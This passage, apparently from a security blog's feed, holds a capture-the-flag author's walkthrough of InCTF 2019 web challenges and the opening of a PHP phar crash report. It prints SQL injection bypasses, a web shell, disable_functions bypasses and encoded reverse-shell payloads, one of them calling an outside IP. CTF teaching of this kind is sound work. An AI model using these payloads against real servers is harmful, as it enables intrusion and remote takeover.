</span><br><span class="line"># This will <span class="keyword">return</span> error</span><br></pre></td></tr></table></figure><p><img src="/images/photos/blog4.2.png" alt="a"></p><p>Now you know how to bypass that only you need to find alternatives of blacklisted keywords. So instead of <code>=</code> you could have used <code>&lt;</code>, for space <code>%0a</code>.  </p><h3 id="Trick-4"><a href="#Trick-4" class="headerlink" title="Trick-4"></a>Trick-4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;root&#x27;</span><span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span>;  # Will <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;root&#x27;</span><span class="operator">&gt;</span><span class="string">&#x27;s&#x27;</span>;  # Will <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p><img src="/images/photos/blog4.3.png" alt="a"></p><p>Like that you can bruteforce and get whole string.</p><p>The <strong>full script</strong> for finding the username can be found <a href="https://github.com/tarunkant/CTF/blob/master/InCTF2019/GoSQLv2/InCTF19-GoSQLv2.py">here</a>.  </p><p>There was one unintended, that I wanted to discuss, one of my teammate(<a href="https://twitter.com/__c3rb3ru5__">@__c3rb3ru5__</a>) found that during challenge <strong>testing phase</strong>(that’s why testing is important ;)). That trick was really mind-fucking.<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;dm&#x27;</span> <span class="string">&#x27;in&#x27;</span><span class="operator">&gt;</span>(<span class="keyword">user</span>()<span class="operator">&gt;</span><span class="string">&#x27;s&#x27;</span>);</span><br></pre></td></tr></table></figure><br>Here if it true you will get redirected else it will return <code>You are not admin</code>. Using that you can dump the user. That’s why I had to blacklist <code>&gt;</code>, because my payload can also work with <code>&lt;</code> ;)  </p><p>Now we go into the second phase of the challenge, that is SSRF + bypass disable_functions to get RCE.  </p><p>The first few steps are same as last year, get to know the user_privileges and read the mysql conf file, using that write the shell payload at <code>URL/tmp_hell</code>. These things you can do using <a href="https://github.com/tarunkant/Gopherus">Gopherus</a>. There you can see that you will not able to execute the <code>system</code> commands, because of disable_function. So next thing you would do is to run <code>phpinfo()</code> and you will see the list of disable_function:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,stream_socket_sendto,stream_socket_client,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,imap_open,ld,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</span><br></pre></td></tr></table></figure><br>and open_basedir:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir = &quot;/var/www/html:/tmp/test1&quot;</span><br></pre></td></tr></table></figure></p><h3 id="Trick-5"><a href="#Trick-5" class="headerlink" title="Trick-5"></a>Trick-5</h3><p>Bypass open_basedir using:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_list = array(); $it = new DirectoryIterator(&quot;glob:///va?/ru?/p?p//*&quot;); foreach($it as $f) &#123; $file_list[] = $f-&gt;__toString(); &#125; echo 1234; $it = new DirectoryIterator(&quot;glob:///va?/ru?/p?p/.*&quot;); foreach($it as $f) &#123; $file_list[] = $f-&gt;__toString(); &#125; sort($file_list); foreach($file_list as $f)&#123; echo $f . &quot;\n&quot;; &#125;</span><br></pre></td></tr></table></figure><br>Thanks to <a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy">balsn-writeup</a>.</p><p>There you can find php-fpm unix socket file which gives you the idea that there is PHP-FPM installed in the server.<br>Now you need to poison the request to the unix socket to get the shell. You can use <code>fsockopen</code> for writing in the socket file. Payload you can generate from <a href="https://github.com/tarunkant/Gopherus">Gopherus</a>, and make sure you don’t use default file name, use <code>/var/www/html/index.php</code> instead.<br>The payload for getting shell:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fp%20=%20fsockopen(&quot;unix:///var/run/php/php7.0-fpm.sock&quot;,%20-1,%20$errno,%20$errstr,%2030);%20fwrite($fp,base64_decode(&quot;AQEAAQAIAAAAAQAAAAAAAAEEAAEBBQUADxBTRVJWRVJfU09GVFdBUkVnbyAvIGZjZ2ljbGllbnQgCwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOA0NPTlRFTlRfTEVOR1RIMTAxDgRSRVFVRVNUX01FVEhPRFBPU1QJS1BIUF9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24KZGlzYWJsZV9mdW5jdGlvbnMgPSAKYXV0b19wcmVwZW5kX2ZpbGUgPSBwaHA6Ly9pbnB1dA8XU0NSSVBUX0ZJTEVOQU1FL3Zhci93d3cvaHRtbC9pbmRleC5waHANAURPQ1VNRU5UX1JPT1QvAAAAAAABBAABAAAAAAEFAAEAZQQAPD9waHAgc3lzdGVtKCdiYXNoIC1jICJzaCAtaSA%2BJiAvZGV2L3RjcC8zLjE1LjI1NS4yNC8xMjM0IDA%2BJjEiJyk7ZGllKCctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0KJyk7Pz4AAAAA&quot;));</span><br></pre></td></tr></table></figure></p><h2 id="Copy-Cat"><a href="#Copy-Cat" class="headerlink" title="Copy-Cat"></a>Copy-Cat</h2><p>This was code-review challenge, the challenge story was: There is a website and admin can only login from his office, for making the admin to work from home too, the website developer also implemented a way so that, the admin can also open the website from any other places.<br>So, the task was to hack that implementation and be admin (However, it is the 1st part of the challenge).  </p><h3 id="Bypass-SQLi"><a href="#Bypass-SQLi" class="headerlink" title="Bypass SQLi"></a>Bypass SQLi</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$conn</span>-&gt;real_escape_string(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$tocheck</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$tocheck</span> = trim(escape(<span class="variable">$tocheck</span>));</span><br><span class="line">  <span class="keyword">if</span>(strlen(<span class="variable">$tocheck</span>)&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;For God Sake, don&#x27;t try to HACK me!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(strlen(<span class="variable">$tocheck</span>)&gt;<span class="number">11</span>)&#123;</span><br><span class="line">    <span class="variable">$tocheck</span> = substr(<span class="variable">$tocheck</span>, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$tocheck</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here you have to crack the <code>check</code> function, as this function doing escape and then substr to take first 11 character, you can abuse that to bypass SQL injection.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: 1111111111\</span><br><span class="line">Password: or 1=1-- -</span><br></pre></td></tr></table></figure><br>The escape function will make this username to <code>1111111111\\</code>, but substr will take only 11 character, which made vulnerable this function.<br>After login, you can see the message saying that, you have to proove that you are admin. This time it checks if the user came from <code>127.0.0.1</code> or not!<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$remote_admin</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&#x27;if(isset($_SERVER[&quot;HTTP_I_AM_ADMIN&quot;]))&#123;$_SERVER[&quot;REMOTE_ADDR&quot;] = $_SERVER[&quot;HTTP_I_AM_ADMIN&quot;];&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function admin_<span class="subst">$random</span>() &#123;&quot;</span></span><br><span class="line">  .<span class="string">&quot;global \$remote_admin; \$remote_admin();&quot;</span></span><br><span class="line">  .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">send(<span class="variable">$random</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;random&#x27;</span>]();</span><br></pre></td></tr></table></figure></p><h3 id="Trcik-6"><a href="#Trcik-6" class="headerlink" title="Trcik-6"></a>Trcik-6</h3><p><code>create_function</code> creates <code>lamda</code> function known as Anonymous functions.<br><img src="/images/photos/blog4.4.png" alt="a"></p><p>Using this you need to bypass this stage, <a href="https://github.com/tarunkant/CTF/blob/master/InCTF2019/Copy-Cat/exploit1.py">here</a> you can get the exploit script for doing the same.</p><p>Now admin has the functionality to import zip file, and our game server will extract the non-malicious files.  </p><h4 id="Intended-Step-for-this-stage"><a href="#Intended-Step-for-this-stage" class="headerlink" title="Intended Step for this stage:"></a>Intended Step for this stage:</h4><figure class="highlight php7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExtractZipFile</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$zip</span> = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$file</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckDir</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$filepath</span> = <span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$file</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_file(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">            <span class="variable">$parts</span> = pathinfo(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$ext</span> = strtolower(<span class="variable">$parts</span>[<span class="string">&#x27;extension&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$ext</span>, <span class="string">&#x27;php&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;pl&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;py&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;cgi&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;asp&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;js&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;rb&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">strpos(<span class="variable">$ext</span>, <span class="string">&#x27;htaccess&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;jar&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                @chmod(<span class="variable">$filepath</span>, <span class="number">0666</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                @chmod(<span class="variable">$filepath</span>, <span class="number">0666</span>);    <span class="comment">// just in case the unlink fails for some reason</span></span><br><span class="line">                unlink(<span class="variable">$filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$file</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&#x27;..&#x27;</span> &amp;&amp; is_dir(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">            CheckDir(<span class="variable">$filepath</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CheckDir</code> is the function to check and remove malicious files. And <code>ExtractZipFile</code> functions will extract the files from zip. So, let’s see how these functions are called.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ExtractZipFile(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$SANDBOX</span>);</span><br><span class="line">CheckDir(<span class="variable">$SANDBOX</span>);</span><br></pre></td></tr></table></figure><br>Do you see the problem here? <strong>Race-Condition</strong>. So using the Race Condition you can execute PHP files before it gets deleted, so you can see that it’s too much unstable. Not everytime for running a PHP code I can make race-codition.<br>So we need to find a stable method from where you can quey PHP codes.<br>So here is the idea, what if you can put file in parent directory because the function <code>CheckDir</code> checks for malicious file in current directory(recursively).<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&lt;?php eval($_GET[\&#x27;cmd\&#x27;]); ?&gt; &#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&quot;../a.php&quot;</span>,<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><br>So putting this file using Race-Condition will give us to execute PHP codes.</p><h4 id="Unintended-Step-for-the-same-stage"><a href="#Unintended-Step-for-the-same-stage" class="headerlink" title="Unintended Step for the same stage:"></a>Unintended Step for the same stage:</h4><p>The unintended was to upload <code>.pht</code> files because server treats them as <code>php</code> file.</p><p><strong>Now from both ways you can create a stable file from where you can execute PHP code.</strong></p><p>If you see the <code>phpinfo()</code>, you can see the disable_function list:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,imap_open,ld,mail,fread,fopen,file_get_contents,readfile,chdir</span><br></pre></td></tr></table></figure></p><p>Here, you can see that <code>putenv</code> is not there, but all the majorly known function like, <code>error_log</code> and <code>mail</code> are blocked. And also PHP-Imagick library is not there.<br>But there is function which works same as <code>mail</code> is <code>mb_send_mail</code> (For this to be working <code>mbstring</code> module should be there).<br>This function came up when I was fuzzing the php-functions to see which all functions calls execve internally. We(I and <a href="https://twitter.com/__c3rb3ru5__">@__c3rb3ru5__</a>) implemented a <strong>dumb</strong> fuzzer for that. We will be releasing a blog soon with the result of our small research.  </p><p>So final exploit:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#For getting consistent php code execution</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&lt;?php eval($_GET[\&#x27;cmd\&#x27;]); ?&gt; &#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&quot;../a.php&quot;</span>,<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#For bypassing disable_function and getting RCE</span></span><br><span class="line">rename(<span class="string">&quot;./exploit.txt&quot;</span>,<span class="string">&quot;/tmp/exploit.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">chmod(<span class="string">&quot;/tmp/exploit.txt&quot;</span>,<span class="number">0755</span>);</span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/tmp/exploit.txt&quot;</span>);</span><br><span class="line">mb_send_mail(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>The exploit.c file:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;bash -c \&quot;sh -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>You can get here the exploit for Race-Condition <a href="https://github.com/tarunkant/CTF/blob/master/InCTF2019/Copy-Cat/exploit2.py">here</a>.</p><h2 id="PHP-Series"><a href="#PHP-Series" class="headerlink" title="PHP Series"></a>PHP Series</h2><p>The PHP series was related to PHP-internals.</p><h3 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP+1"></a>PHP+1</h3><p>In this challenge I didn’t check if the input contains the blacklisted keyword.<br>If you check for disable_functions, you will found that <code>proc_open</code> was unblocked.<br>So there can be several solutions for this stage, here is one:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x=(ch).(r);$k=$x(95);$l=$x(47);$a=(pr).(oc).$k.(op).(en);$b=($l.readFlag);$c=(p).(i).(pe);$d=r;$e=w;$f=(p).(i).(pes);$g=(pri).(nt).$k.(r);$h=(str).(eam).$k.(ge).(t).$k.(con).(tents);$i=(arra).(y).$k.(sh).(ift);$j=(arra).(y).$k.(sl).(ice);$z=$a($b,array(array($c,$d),array($c,$e),array($c,$e)),$$f);$g($h($i($j($$f,1,2))));</span><br></pre></td></tr></table></figure></p><h3 id="PHP-1-5"><a href="#PHP-1-5" class="headerlink" title="PHP+1.5"></a>PHP+1.5</h3><p>Here the blacklist check was being done, but no check on length of input. So again:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x=(ch).(r);$k=$x(95);$l=$x(47);$a=(pr).(oc).$k.(op).(en);$b=($l.readFlag);$c=(p).(i).(pe);$d=r;$e=w;$f=(p).(i).(pes);$g=(pri).(nt).$k.(r);$h=(str).(eam).$k.(ge).(t).$k.(con).(tents);$i=(arra).(y).$k.(sh).(ift);$j=(arra).(y).$k.(sl).(ice);$z=$a($b,array(array($c,$d),array($c,$e),array($c,$e)),$$f);$g($h($i($j($$f,1,2))));</span><br></pre></td></tr></table></figure></p><h3 id="PHP-2"><a href="#PHP-2" class="headerlink" title="PHP+2"></a>PHP+2</h3><p>In this challenge the <code>proc_open</code> was blocked. This challenge was based on 1day exploit, you can see the actual PoC <a href="https://bugs.php.net/bug.php?id=77843">here</a>.<br> You can also get the exploit code <a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">here</a> (Thanks to OpenToAll for this). OpenToAll was the only team to solve this challenge.</p><p>If you are wondering how we can put this big file under the given condition of length constraint, here is the snippet:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def e(s):</span><br><span class="line">    return &#x27;&#x27;.join([chr(ord(c) ^ 0xff) for c in s]) + &#x27;^&#x27; + &#x27;\xff&#x27; * len(s)</span><br><span class="line"></span><br><span class="line">p = &#x27;$p=%s;&#x27; % e(&#x27;_POST&#x27;)</span><br><span class="line">p += &#x27;$l=%s;$n=%s;$m=$n(%s,$l($$p));$m();&#x27; % (e(&#x27;current&#x27;), e(&#x27;create_function&#x27;), e(&#x27;$x&#x27;))</span><br></pre></td></tr></table></figure></p><h3 id="PHP-2-5"><a href="#PHP-2-5" class="headerlink" title="PHP+2.5"></a>PHP+2.5</h3><p>In this challenge <code>prroc_open</code> was unblocked. The intended solution was to find a Segmentation Fault, and using that upload the file and using Race-Condition get the shell.<br>If you are not familiar with this, RCE through Segfault+LFI, you can read <a href="https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/">this blog</a>.<br>As of my PoC, you can visit to this <a href="https://bugs.php.net/bug.php?id=78583">bug</a>.  </p><p>The unintended solution was to find a working payload which is less than 100 length and that we found in PHP+2 itself.</p><p>I hope you get fun solving my InCTF challenges and may this blog help you to understand the challenge solutions.</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Writeup </tag>
            
            <tag> InCTF </tag>
            
            <tag> Gopherus </tag>
            
            <tag> SQL </tag>
            
            <tag> RCE </tag>
            
            <tag> Code-Review </tag>
            
            <tag> PHP </tag>
            
            <tag> Segmentation-Fault </tag>
            
            <tag> disable_functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Null Pointer Dereference on including PHAR file twice resulted in Segmentation-fault</title>
      <link href="/2019/07/06/segmentation-fault-on-using-phar/"/>
      <url>/2019/07/06/segmentation-fault-on-using-phar/</url>
      
        <content type="html"><![CDATA[<p>Hey, I am SpyD3r(<a href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog, I will be discussing the bug(the Segmentation-fault) I have found in php while playing with phar, couldn’t make this bug a security issue though :(. The issue was occurring when the same phar file gets included twice and this bug was affected in all versions of PHP.  </p><h2 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h2><p>When I tried to import a “phar” file (i.e using the phar wrapper) twice, php results in a segmentation fault. Attaching gdb, I noticed that the crash occurred in the <code>_php_stream_seek</code> function. The issue was that all the arguments to this function were null (including the php_stream object). This leads to an invalid compare statement (accessing an invalid address), resulting in a crash. We tried analyzing this, but since we are novices with the php codebase, all the following could be wrong. <code>phar_stream_read</code> called <code>_php_stream_seek</code>. The argument of <code>phar_stream_read</code> which is a php_stream had the <code>stream-&gt;abstract-&gt;fp</code> as NULL, instead of a valid <code>php_stream</code>.<br>Basically, Null pointer dereference is taking place in the <code>_php_stream_seek</code> because the php_stream that the <code>_php_stream_seek</code> function is trying to access was closed afer the first <code>include</code>.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact:"></a>Impact:</h2><p>This could be dangerous, as Local File Inclusion(LFI) + Segmentation_fault will leads to RCE, as I disussed this in my previous blog, <a href="&quot;https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/#Return-of-One-line-PHP&quot;">check it here</a>. This can be exploited as sending php shell, at the time it gets segmentation fault will lead to make temporary php file in temp folder(which won’t get deleted) and can be triggered using LFI with brute-forcing for file.</p><p>But getting all this(File Upload vuln + Partial PHP code execution(we need this because we need to include phar file twice)) on one application in real-world is somewhat tough, so this bug is open now.  </p><h2 id="Test-Script"><a href="#Test-Script" class="headerlink" title="Test-Script"></a>Test-Script</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">For</span> creating phar file</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Script that triggers Segmentation fault:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;phar://test.phar&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;phar://test.phar&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Practical-aspect"><a href="#Practical-aspect" class="headerlink" title="Practical aspect"></a>Practical aspect</h2><p>Here is practical aspect of this, if you use this big php code base, it is easily possible that you created a file and includes two of other files and a chance there both of the other file includes same file. We see an example here.<br>Let’s say <code>a.php</code> contains:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#which includes b.php and c.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;b.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;c.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hey&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><code>b.php</code> includes test.phar:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 